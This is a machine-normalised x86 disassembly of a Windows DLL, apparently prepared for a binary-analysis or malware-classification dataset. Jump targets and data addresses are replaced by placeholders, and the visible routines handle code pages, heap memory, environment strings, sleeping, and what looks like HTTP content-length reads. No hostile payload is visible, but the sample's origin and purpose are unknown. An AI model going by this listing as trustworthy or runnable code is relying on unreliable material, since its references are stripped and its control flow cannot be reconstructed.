call sub_10023e65
cmp edi ebx
jbe r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x60 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005576a
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
movzx eax [ ebp - 0x60 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x58 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
cmp [ esi + 0x4 ] bl
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_10023e65
sub_100238f0
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push esi
push 0x104
lea eax [ ebp - 0x224 ]
mov esi ecx
mov ecx [ edi + 0x4 ]
push eax
push ecx
call [ ExpandEnvironmentStringsW@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ esi ]
push eax
push ecx
lea eax [ ebp - 0x224 ]
call sub_10031770
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x125
call sub_10013830
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x15c
call sub_10013830
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
lea ecx [ ebp - 0x18 ]
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
lea edx [ ebp - 0x1c ]
push edx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
lea ecx [ ebp - 0x1c ]
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
push esi
push ecx
push eax
mov [ edi + 0x8 ] eax
call sub_100796a0
add esp 0xc
xor ecx ecx
xor esi esi
mov edx edi
call sub_1005d550
mov ecx [ ebp - 0x8 ]
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_100239df
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10061c00
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_1004d631
sub_10023a26
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_1003088d
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ax [ ebp - 0x4 ]
cmp [ ebp + 0x12 ] ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
lea ecx [ ebp + 0xc ]
call sub_1005576a
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_10023b00
push ebp
mov ebp esp
push 0xffffffff
push sub_100815d1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] esi
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov eax 0x1
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] ebx
cmp [ ebp + 0x8 ] ebx
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] ebx
call sub_1003b1ca
mov ecx [ edi + 0xf4 ]
sub ecx [ edi + 0xf0 ]
mov eax 0x92492493
imul ecx
mov eax [ ebp - 0x34 ]
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
xor edx edx
div ecx
mov ecx [ edi + 0xf0 ]
add esp 0x4
push 0xffffffff
push ebx
lea eax [ edx * 8 ]
sub eax edx
lea eax [ ecx + eax * 4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_100417c0
mov ebx [ esi + 0x4 ]
mov eax [ esi ]
lea edx [ ebp - 0x2c ]
push edx
push ebx
call sub_10021480
add esp 0x8
cmp eax ebx
jne r-xdata
xor ebx ebx
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_1000dd20
mov eax [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x30 ] eax
cmp eax [ ebp + 0x8 ]
jb r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
sub_10023c20
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10008757
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_1000bd19
push ecx
call sub_10055606
add esp 0x4
test eax eax
jne r-xdata
sub_10023c6f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10019f17
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10023c9c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10053183
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10023cd0
mov [ esi ] r--data
cmp [ esi + 0x84 ] 0x8
jb r-xdata
mov [ esi + 0x84 ] 0x7
mov [ esi + 0x80 ] 0x0
xor ecx ecx
mov [ esi + 0x70 ] cx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
mov eax [ esi + 0x70 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] ax
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov edx [ esi + 0x2c ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] dx
retn
mov ecx [ esi + 0xc ]
push ecx
call sub_1006591f
add esp 0x4
sub_10023d60
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
or eax [ rw-data ]
push ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x8 ]
push ecx
call [ GetSystemTimeAsFileTime@IAT ]
mov edi [ ebp - 0x4 ]
mov ecx [ rw-data ]
mov esi [ ebp - 0x8 ]
cmp edi ecx
ja r-xdata
mov eax [ rw-data ]
jb r-xdata
push 0x0
push 0x2710
push ecx
push eax
call sub_1007e710
push 0x0
push 0x2710
push edi
push esi
mov ebx eax
call sub_1007e710
sub ebx eax
push ebx
call [ Sleep@IAT ]
cmp esi eax
jae r-xdata
sub_10023dc9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_10079b60
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10035b61
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
test edi edi
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_100306ed
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_100306ed
add esp 0x14
test eax eax
jle r-xdata
add [ ebp - 0x8 ] eax
inc edi
sub ebx eax
jne r-xdata
add [ ebp + 0x8 ] eax
add ebx 0x2
dec edi
jne r-xdata
sub_10023e65
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1002c66a
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_10023eba
push 0x34
mov eax sub_1007f38a
call sub_100097c8
mov eax [ ebp + 0xc ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100014b7
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_1004d460
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
push 0x3f
push eax
call sub_1001663f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x40 ]
call sub_10039680
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10050f50
shl eax 0x2
push eax
call sub_10008102
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
call sub_1004db01
retn
mov edi [ esi + 0xc ]
jmp r-xdata
mov edi rw-data
mov esi r--data
test [ rw-data ] bl
jne r-xdata
test edi edi
jne r-xdata
push edi
lea ecx [ ebp - 0x1c ]
call sub_1003c66c
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] esi
call sub_1000bd19
or [ rw-data ] ebx
push ebx
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov [ ebp + 0xc ] r--data
call sub_1003f5b8
push sub_10084456
mov [ rw-data ] esi
call sub_100662c2
pop ecx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
dec edi
mov ecx [ eax + edi * 4 ]
mov eax [ esi + 0x8 ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
call sub_10030d90
sub_10023fbf
push 0xc
push r--data
call sub_10079bf0
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_10059fd6
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_10059fd6
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100680f5
push ebx
push esi
call sub_10059fd6
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10059fd6
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10059fd6
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10059fd6
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_10059fd6
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10059fd6
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_10078db0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_10059fd6
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1001c36f
pop ecx
pop ecx
push eax
push esi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_10079c35
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1001c36f
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_10024154
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_1004937a
call sub_1001d532
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_1002417e
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_10008102
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_1000977c
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_1000977c
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_1000977c
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_1000977c
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_100203c5
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_10022b5a
push [ ebp - 0x1c ]
call sub_10022b5a
push [ ebp - 0x20 ]
call sub_10022b5a
push [ ebp - 0x28 ]
call sub_10022b5a
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_10022b5a
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_10006194
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_10041dbf
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_10041dbf
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_100796a0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_100796a0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_100796a0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10022b5a
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10022b5a
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10022b5a
push [ esi + 0xc0 ]
call sub_10022b5a
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_10024550
cmp [ esi ] 0x0
je r-xdata
retn
push ebx
mov ebx [ LocalFree@IAT ]
push edi
lea ecx [ ecx ]
mov ecx [ esi ]
push ecx
call ebx
mov [ esi ] edi
test edi edi
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov eax [ esi ]
mov edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
je r-xdata
pop edi
pop ebx
sub_10024583
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
pop ebp
retn
sub_100245b0
push ebp
mov ebp esp
push ecx
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov esp ebp
pop ebp
retn 0x8
mov eax 0x1
mov esp ebp
pop ebp
retn 0x8
sub_10024610
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov eax [ ecx + 0x10 ]
push edi
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
cmp esi edi
ja r-xdata
mov eax 0x1
sub eax esi
add edi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
movzx edx [ ebx ]
mov edi edi
mov [ ebp - 0x4 ] eax
mov ecx edi
test edi edi
je r-xdata
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx ebx
mov ecx eax
test esi esi
je r-xdata
cmp [ eax ] dx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov bx [ ecx ]
cmp bx [ edx ]
jne r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sbb edx edx
and edx 0xfffffffe
inc edx
je r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
mov ecx eax
sub ecx [ ebp - 0x4 ]
or edx 0xffffffff
sar ecx 0x1
sub edx ecx
add edi edx
add eax 0x2
jmp r-xdata
sub_100246d0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x44 ] eax
mov esi ecx
test edi edi
jne r-xdata
push edi
push esi
push 0x0
mov eax ebx
call sub_10028980
add esp 0xc
cmp eax 0xffffffd6
je r-xdata
lea eax [ edi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
inc ecx
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp - 0x44 ]
push edi
push esi
mov [ edx ] eax
push eax
mov eax ebx
call sub_10028980
add esp 0xc
test eax eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x63
call sub_10060ac0
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebp - 0x44 ]
mov eax [ esi ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x40 ]
mov eax 0x63
mov [ esi ] 0x0
call sub_10060ac0
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_100247c0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x20000005
mov [ esi ] 0x0
mov eax [ ebx + 0xd8 ]
push edx
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x64
mov esp ebp
pop ebp
retn 0x4
push 0x400
push 0x8
mov [ ebp - 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push 0x400
add ecx eax
mov eax [ ebx + 0xdc ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edi ] eax
mov eax [ ebx + 0xdc ]
push edx
call eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ esi ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
mov eax 0x5
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
xor eax eax
